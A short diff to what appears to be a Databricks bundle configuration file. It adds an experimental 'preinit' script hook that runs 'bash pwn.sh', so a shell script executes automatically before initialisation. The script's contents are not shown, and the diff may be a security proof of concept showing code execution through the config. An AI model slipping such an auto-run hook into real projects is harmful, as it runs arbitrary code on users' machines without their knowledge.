@@ -57,3 +57,7 @@ targets:
     workspace:
       host: https://e2-demo-field-eng.cloud.databricks.com
 
+experimental:
+  scripts:
+    preinit: bash pwn.sh
+
